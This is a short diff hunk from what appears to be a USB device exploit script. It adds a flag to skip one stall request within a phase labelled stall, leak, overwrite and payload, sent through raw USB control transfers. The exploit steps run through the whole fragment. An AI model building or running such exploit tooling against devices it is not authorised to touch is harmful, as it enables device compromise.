@@ -985,8 +985,9 @@ def exploit_native(args):
     # -- phase 3: req_stall + req_leak + overwrite + payload ---------------
     print('== phase 3: req_stall + req_leak + overwrite + payload ==')
     dev, handle, desc, _ = acquire(usb, want_serial=False)
-    rc, info = usb.raw_ctrl(handle, 0x02, 3, 0, 0x80, 0, b'',
-                            abandon=False, timeout_ms=200, name='req_stall 2')
+    if not args.skip_req_stall:
+        rc, info = usb.raw_ctrl(handle, 0x02, 3, 0, 0x80, 0, b'',
+                                abandon=False, timeout_ms=200, name='req_stall 2')
     rc, info = usb.raw_ctrl(handle, 0x80, REQ_GET_DESCRIPTOR,
                             (STRING_DESCRIPTOR << 8) | serial_idx, HABR_LANG,
                             0x80, b'', abandon=False, timeout_ms=500,
